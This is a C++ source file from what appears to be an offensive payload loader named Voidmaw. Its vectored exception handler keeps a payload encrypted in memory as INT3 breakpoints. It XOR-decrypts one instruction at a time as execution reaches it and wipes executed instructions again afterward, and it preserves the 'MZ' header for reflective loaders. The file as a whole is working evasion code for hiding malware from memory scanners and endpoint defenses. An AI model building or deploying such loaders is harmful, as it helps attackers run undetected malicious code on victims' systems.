#include "veh.h"
#include "utils.h"



#include "C:\Users\malloc\source\Voidmaw\x64\Debug\out.h"  //PATH TO GENERATED HEADER FILE BY DISMANTLE.EXE


BYTE mzValue[] = "MZ";

extern PBYTE payloadLowerBoundAddr;
extern PBYTE payloadUpperBoundAddr;

std::vector < std::pair<DWORD, DWORD> > asmCleanQueue;

LONG VehPayload(EXCEPTION_POINTERS* ExceptionInfo)
{
    if (ExceptionHappenedInOurPayload(ExceptionInfo->ExceptionRecord->ExceptionAddress))
    {
        if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT)
        {
            if (asmCleanQueue.size())
            {
                //put some lock to prevent race condition?
                for (INT i = 0; i < asmCleanQueue.size(); i++)
                {
                    DWORD asmOffset = asmCleanQueue[i].first;
                    DWORD asmLen = asmCleanQueue[i].second;
                    memset(payloadLowerBoundAddr + asmOffset, ASM_INT3, asmLen);
                }
                asmCleanQueue.clear();
            }
            DWORD64 asmOffsetFromBase = FindRipOffsetFromPayloadBase(ExceptionInfo->ContextRecord->Rip);


            auto it = payloadExecutedAsm.find(asmOffsetFromBase);
            if (it == payloadExecutedAsm.end())
            {
                LogProgramFail("Failed to find offset in map... Exiting...");
                TerminateProcess(GetCurrentProcess(), EXIT_FAILURE);
            }
            else
            {
                PBYTE asmAddr = (PBYTE)ExceptionInfo->ContextRecord->Rip;
                DWORD asmLen = it->second.size();
                for (INT i = 0; i < asmLen; i++)
                {
                    asmAddr[i] = it->second[i] ^ encryptionKey[i];
                }
                //dont clear out the MZ (reflective loaders look for this value, if it's hidden by INT3, reflective loaders may fail)
                if (asmLen == 2 && !memcmp(asmAddr, mzValue, 2))
                {

                }
                else
                {
                    std::pair<DWORD, DWORD>asmToClean;
                    asmToClean.first = asmOffsetFromBase;
                    asmToClean.second = asmLen;
                    asmCleanQueue.push_back(asmToClean);
                }

                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
        else  return EXCEPTION_CONTINUE_SEARCH;
    }
    else return EXCEPTION_CONTINUE_SEARCH;
}

BOOL ExceptionHappenedInOurPayload(PVOID exceptionAddress)
{
    if (payloadLowerBoundAddr <= exceptionAddress && exceptionAddress <= payloadUpperBoundAddr)
    {
        return TRUE;
    }
    return FALSE;
}

DWORD64 FindRipOffsetFromPayloadBase(DWORD64 rip)
{
    return  rip - (DWORD64)payloadLowerBoundAddr;
}

std::string GenerateXorKeyForAsm(DWORD asmLen)
{
    std::string result;
    for (INT i = 0; i < asmLen; i++)
    {
        CHAR randomKeyChar = 1 + (rand() % 255);
        result += randomKeyChar;
    }
    return result;
}